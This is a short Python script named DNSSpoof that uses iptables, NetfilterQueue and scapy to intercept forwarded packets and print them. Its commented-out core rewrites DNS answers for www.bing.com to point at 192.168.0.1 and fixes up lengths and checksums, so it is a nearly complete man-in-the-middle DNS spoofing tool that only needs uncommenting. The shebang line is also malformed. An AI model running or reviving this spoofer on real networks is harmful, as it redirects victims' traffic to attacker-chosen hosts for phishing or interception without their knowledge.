#! user/bin/env python

import netfilterqueue
import scapy.all as scapy
import os


class DNSSpoof:
    def __init__(self):
        os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
        self.queue = netfilterqueue.NetfilterQueue()  # object of netfilterqueue class
        self.queue.bind(0, self.process_packet)  # bind the object to the que created in iptables
        self.handle_spoof()

    def handle_spoof(self):
        try:
            self.queue.run()
        except KeyboardInterrupt:
            print("\n\n[+] CTRL + C detected, exiting program and resetting iptables ...\n\n")
            os.system("iptables --flush")

    def process_packet(self, packet):
        scapy_packet = scapy.IP(packet.get_payload())
        print(scapy_packet.show())
        if scapy_packet.haslayer(scapy.DNSRR):
            # qname = scapy_packet[scapy.DNSQR].qname
            # if "www.bing.com" in qname:
            #     print("[+] Spoofing Target" + str(qname))
            #     answer = scapy.DNSRR(rrname=qname, rdata="192.168.0.1")
            #     scapy_packet[scapy.DNS].an = answer
            #     scapy_packet[scapy.DNS].ancount = 1
            #
            #     del scapy_packet[scapy.IP].len
            #     del scapy_packet[scapy.IP].chksum
            #     del scapy_packet[scapy.UDP].len
            #     del scapy_packet[scapy.UDP].chksum
            #
            #     packet.set_payload(str(scapy_packet))

            print(scapy_packet.show())
        # print(scapy_packet)

        # now forward this modified packet
        packet.accept()


dns_spoofer = DNSSpoof()
